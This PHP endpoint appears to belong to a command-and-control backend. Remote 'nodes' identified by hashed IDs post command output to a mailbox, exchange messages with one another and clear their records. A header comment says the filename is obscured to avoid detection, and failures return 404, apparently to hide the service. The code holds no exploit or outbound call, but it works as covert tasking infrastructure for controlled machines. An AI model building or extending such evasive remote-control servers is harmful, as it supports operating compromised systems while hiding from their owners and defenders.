<?php
/**
 * messages.php - Mailbox and message operations
 * Obscured name to avoid detection
 */

require_once __DIR__ . '/config.php';

header('Content-Type: application/json');

$validated = validateRequest();
$db = getDB();

if (!$db) {
    sendJSON(['error' => 'Service unavailable'], 503);
}

$method = $_SERVER['REQUEST_METHOD'];
$nodeId = $validated['node_id'];
$body = $validated['body'] ?? [];

// Get node ID
$stmt = $db->prepare("SELECT id FROM nodes WHERE node_id_hash = ?");
$stmt->execute([$nodeId]);
$node = $stmt->fetch();

if (!$node) {
    send404();
}

try {
    switch ($method) {
        case 'POST':
            // Write to mailbox (command output, notifications) or send message to specific node
            $messageType = $body['message_type'] ?? 'command_output';
            
            if ($messageType === 'command_output' || $messageType === 'notification') {
                // Mailbox entry (command output or general notification)
                $commandId = $body['command_id'] ?? null;
                $content = $body['content'] ?? $body['message'] ?? '';
                $msgType = $body['type'] ?? $messageType;
                $ttlDays = $body['ttl_days'] ?? DEFAULT_TTL_DAYS;
                
                $insertStmt = $db->prepare("
                    INSERT INTO mailbox (node_id, command_id, message_type, content, expires_at)
                    VALUES (?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL ? DAY))
                ");
                $insertStmt->execute([$node['id'], $commandId, $msgType, $content, $ttlDays]);
                
                sendJSON([
                    'status' => 'ok',
                    'message_id' => $db->lastInsertId()
                ]);
            } else {
                // Direct message to another node
                $toNode = $body['to_node'] ?? null;
                $message = $body['message'] ?? '';
                $ttlDays = $body['ttl_days'] ?? DEFAULT_TTL_DAYS;
                
                if (!$toNode || !$message) {
                    sendJSON(['error' => 'Missing required fields'], 400);
                }
                
                // Find target node
                $targetStmt = $db->prepare("
                    SELECT id FROM nodes 
                    WHERE (hostname = ? OR custom_name = ?) AND status = 'active'
                    LIMIT 1
                ");
                $targetStmt->execute([$toNode, $toNode]);
                $target = $targetStmt->fetch();
                
                if (!$target) {
                    sendJSON(['error' => 'Target node not found'], 404);
                }
                
                $insertStmt = $db->prepare("
                    INSERT INTO messages (from_node_id, to_node_id, message, expires_at)
                    VALUES (?, ?, ?, DATE_ADD(NOW(), INTERVAL ? DAY))
                ");
                $insertStmt->execute([$node['id'], $target['id'], $message, $ttlDays]);
                
                sendJSON([
                    'status' => 'ok',
                    'message_id' => $db->lastInsertId()
                ]);
            }
            break;
            
        case 'GET':
            // Read mailbox entries or messages
            $type = $_GET['type'] ?? 'mailbox';
            
            if ($type === 'mailbox') {
                $cmdId = $_GET['command_id'] ?? null;
                $stmt = $db->prepare("
                    SELECT id, command_id, message_type, content, created_at
                    FROM mailbox
                    WHERE node_id = ?
                    " . ($cmdId ? "AND command_id = ?" : "") . "
                    AND (expires_at IS NULL OR expires_at > NOW())
                    ORDER BY created_at DESC
                    LIMIT 100
                ");
                
                if ($cmdId) {
                    $stmt->execute([$node['id'], $cmdId]);
                } else {
                    $stmt->execute([$node['id']]);
                }
                
                $entries = $stmt->fetchAll();
                sendJSON(['status' => 'ok', 'entries' => $entries]);
            } else {
                // Messages
                $unreadOnly = isset($_GET['unread']) && $_GET['unread'] === '1';
                $sql = "
                    SELECT 
                        m.id,
                        m.message,
                        m.is_read,
                        m.created_at,
                        m.read_at,
                        n.hostname as from_hostname,
                        n.custom_name as from_name
                    FROM messages m
                    LEFT JOIN nodes n ON m.from_node_id = n.id
                    WHERE m.to_node_id = ?
                    " . ($unreadOnly ? "AND m.is_read = FALSE" : "") . "
                    AND (m.expires_at IS NULL OR m.expires_at > NOW())
                    ORDER BY m.created_at DESC
                ";
                
                $stmt = $db->prepare($sql);
                $stmt->execute([$node['id']]);
                $messages = $stmt->fetchAll();
                
                sendJSON(['status' => 'ok', 'messages' => $messages]);
            }
            break;
            
        case 'DELETE':
            // Clear mailbox entries or messages
            $type = $_GET['type'] ?? 'mailbox';
            $olderThan = $_GET['older_than'] ?? null;
            
            if ($type === 'mailbox') {
                $sql = "DELETE FROM mailbox WHERE node_id = ?";
                $params = [$node['id']];
                
                if ($olderThan) {
                    $sql .= " AND created_at < DATE_SUB(NOW(), INTERVAL ? DAY)";
                    $params[] = $olderThan;
                }
                
                $stmt = $db->prepare($sql);
                $stmt->execute($params);
            } else {
                $readOnly = isset($_GET['read']) && $_GET['read'] === '1';
                $sql = "DELETE FROM messages WHERE to_node_id = ?";
                $params = [$node['id']];
                
                if ($readOnly) {
                    $sql .= " AND is_read = TRUE";
                }
                
                if ($olderThan) {
                    $sql .= " AND created_at < DATE_SUB(NOW(), INTERVAL ? DAY)";
                    $params[] = $olderThan;
                }
                
                $stmt = $db->prepare($sql);
                $stmt->execute($params);
            }
            
            sendJSON(['status' => 'ok', 'message' => 'Cleared']);
            break;
            
        default:
            send404();
    }
    
} catch (PDOException $e) {
    error_log("Messages error: " . $e->getMessage());
    send404();
}

?>

